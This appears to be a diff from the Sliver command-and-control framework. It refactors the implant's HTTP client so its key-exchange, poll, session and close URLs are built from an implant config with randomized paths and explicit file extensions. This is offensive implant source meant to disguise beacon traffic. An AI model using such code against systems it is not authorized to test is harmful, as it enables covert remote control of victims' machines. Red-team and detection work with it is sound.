@@ -340,21 +340,61 @@ func (s *SliverHTTPClient) pathJoinURL(segments []string) string {
 	return strings.Join(segments, "/")
 }
 
-func (s *SliverHTTPClient) pollURL() *url.URL {
+func (s *SliverHTTPClient) keyExchangeURL() *url.URL {
 	curl, _ := url.Parse(s.Origin)
-
 	segments := []string{
-		// {{range .HTTPC2Config.PollPaths}}
+		// {{range .HTTPC2ImplantConfig.KeyExchangePaths}}
 		"{{.}}",
 		// {{end}}
 	}
 	filenames := []string{
-		// {{range .HTTPC2Config.PollFiles}}
+		// {{range .HTTPC2ImplantConfig.KeyExchangeFiles}}
+		"{{.}}",
+		// {{end}}
+	}
+	curl.Path = s.pathJoinURL(s.randomPath(segments, filenames, "{{.HTTPC2ImplantConfig.KeyExchangeFileExt}}"))
+	return curl
+}
+
+func (s *SliverHTTPClient) pollURL() *url.URL {
+	curl, _ := url.Parse(s.Origin)
+
+	segments := []string{
+		// {{range .HTTPC2ImplantConfig.PollPaths}}
+		"{{.}}",
+		// {{end}}
+	}
+	filenames := []string{
+		// {{range .HTTPC2ImplantConfig.PollFiles}}
 		"{{.}}",
 		// {{end}}
 	}
 
-	curl.Path = s.pathJoinURL(s.randomPath(segments, filenames))
+	curl.Path = s.pathJoinURL(s.randomPath(segments, filenames, "{{.HTTPC2ImplantConfig.PollFileExt}}"))
+	return curl
+}
+
+func (s *SliverHTTPClient) startSessionURL() *url.URL {
+	sessionURI := s.sessionURL()
+	uri := strings.TrimSuffix(sessionURI.String(), "{{ .HTTPC2ImplantConfig.SessionFileExt }}")
+	uri += "{{ .HTTPC2ImplantConfig.StartSessionFileExt }}"
+	curl, _ := url.Parse(uri)
+	return curl
+}
+
+func (s *SliverHTTPClient) sessionURL() *url.URL {
+	curl, _ := url.Parse(s.Origin)
+	segments := []string{
+		// {{range .HTTPC2ImplantConfig.SessionPaths}}
+		"{{.}}",
+		// {{end}}
+	}
+	filenames := []string{
+		// {{range .HTTPC2ImplantConfig.SessionFiles}}
+		"{{.}}",
+		// {{end}}
+	}
+	curl.Path = s.pathJoinURL(s.randomPath(segments, filenames, "{{.HTTPC2ImplantConfig.SessionFileExt}}"))
 	return curl
 }
 
@@ -362,65 +402,22 @@ func (s *SliverHTTPClient) closeURL() *url.URL {
 	curl, _ := url.Parse(s.Origin)
 
 	segments := []string{
-		// {{range .HTTPC2Config.ClosePaths}}
+		// {{range .HTTPC2ImplantConfig.ClosePaths}}
 		"{{.}}",
 		// {{end}}
 	}
 	filenames := []string{
-		// {{range .HTTPC2Config.CloseFiles}}
+		// {{range .HTTPC2ImplantConfig.CloseFiles}}
 		"{{.}}",
 		// {{end}}
 	}
 
-	curl.Path = s.pathJoinURL(s.randomPath(segments, filenames))
-	return curl
-}
-
-func (s *SliverHTTPClient) sessionURL() *url.URL {
-	curl, _ := url.Parse(s.Origin)
-	segments := []string{
-		// {{range .HTTPC2Config.SessionPaths}}
-		"{{.}}",
-		// {{end}}
-	}
-	filenames := []string{
-		// {{range .HTTPC2Config.SessionFiles}}
-		"{{.}}",
-		// {{end}}
-	}
-	curl.Path = s.pathJoinURL(s.randomPath(segments, filenames))
-	return curl
-}
-
-func (s *SliverHTTPClient) startSessionURL() *url.URL {
-	curl := s.sessionURL()
-	curl, _ = url.Parse(strings.Replace(
-		curl.String(),
-		".{{ .HTTPC2Config.SessionFileExt }}",
-		".{{ .HTTPC2Config.StartSessionFileExt }}",
-		1,
-	))
-	return curl
-}
-
-func (s *SliverHTTPClient) keyExchangeURL() *url.URL {
-	curl, _ := url.Parse(s.Origin)
-	segments := []string{
-		// {{range .HTTPC2Config.KeyExchangePaths}}
-		"{{.}}",
-		// {{end}}
-	}
-	filenames := []string{
-		// {{range .HTTPC2Config.KeyExchangeFiles}}
-		"{{.}}",
-		// {{end}}
-	}
-	curl.Path = s.pathJoinURL(s.randomPath(segments, filenames))
+	curl.Path = s.pathJoinURL(s.randomPath(segments, filenames, "{{.HTTPC2ImplantConfig.CloseFileExt}}"))
 	return curl
 }
 
 // Must return at least a file name, path segments are optional
-func (s *SliverHTTPClient) randomPath(segments []string, filenames []string) []string {
+func (s *SliverHTTPClient) randomPath(segments []string, filenames []string, ext string) []string {
 	genSegments := []string{}
 	if 0 < len(segments) {
 		n := insecureRand.Intn(len(segments)) // How many segments?
@@ -430,7 +427,11 @@ func (s *SliverHTTPClient) randomPath(segments []string, filenames []string) []s
 		}
 	}
 	filename := filenames[insecureRand.Intn(len(filenames))]
-	genSegments = append(genSegments, filename)
+
+	// {{if .Config.Debug}}
+	log.Printf("[http] segments = %v, filename = %s, ext = %s", genSegments, filename, ext)
+	// {{end}}
+	genSegments = append(genSegments, fmt.Sprintf("%s.%s", filename, ext))
 	return genSegments
 }
 
